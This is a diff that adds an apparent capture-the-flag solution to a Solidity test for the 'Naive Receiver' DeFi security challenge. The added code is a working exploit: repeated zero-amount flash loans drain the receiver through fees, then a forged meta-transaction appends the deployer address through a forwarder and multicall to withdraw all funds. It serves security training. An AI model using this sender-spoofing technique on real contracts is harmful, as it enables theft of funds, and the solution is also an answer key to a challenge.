@@ -77,7 +77,58 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        // Array to hold all encoded calldata for multicall (10 flashloans + 1 withdrawal)
+        bytes[] memory callDatas = new bytes[](11);
+
+        // Encode 10 flashloan calls with 0 amount to drain receiver via fees each iteration
+        for(uint i=0; i<10; i++){
+            callDatas[i] = abi.encodeCall(
+                NaiveReceiverPool.flashLoan,
+                (receiver, address(weth), 0, "0x")  // 0 loan amount, but fee still charged
+            );  
+        }
+
+        // Encode withdrawal call to drain both pool and receiver funds to recovery address
+        // Appends deployer address as extra bytes (used as msg.sender override via forwarder)
+        callDatas[10] = abi.encodePacked(
+            abi.encodeCall(
+                NaiveReceiverPool.withdraw,
+                (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))  // withdraw full balance
+            ),
+            bytes32(uint256(uint160(deployer)))  // append deployer as trusted sender context
+        ); 
+
+        // Wrap all calls into a single multicall to execute atomically in one transaction
+        bytes memory multicallData = abi.encodeCall(pool.multicall, callDatas);
+
+        // Build a meta-transaction request for the BasicForwarder (EIP-712 style)
+        BasicForwarder.Request memory request = BasicForwarder.Request(
+            player,          // from: the signer of this meta-tx
+            address(pool),   // target contract to forward calls to
+            0,               // value (no ETH sent)
+            gasleft(),       // gas limit for execution
+            forwarder.nonces(player),  // replay-protection nonce
+            multicallData,   // the actual calldata to forward
+            1 days           // deadline: request valid for 1 day
+        ); 
+
+        // Compute EIP-712 hash: domain separator + structured data hash, with prefix
+        bytes32 requestHash = keccak256(
+            abi.encodePacked(
+                "\x19\x01",                        // EIP-191 typed data prefix
+                forwarder.domainSeparator(),        // contract's EIP-712 domain
+                forwarder.getDataHash(request)      // hash of the request struct
+            )
+        );
+
+        // Sign the request hash with the player's private key (produces v, r, s components)
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
+
+        // Pack signature components in r, s, v order (as expected by the forwarder)
+        bytes memory signatures = abi.encodePacked(r, s, v);
+
+        // Submit the signed meta-transaction through the forwarder to execute all calls
+        forwarder.execute(request, signatures);  
     }
 
     /**
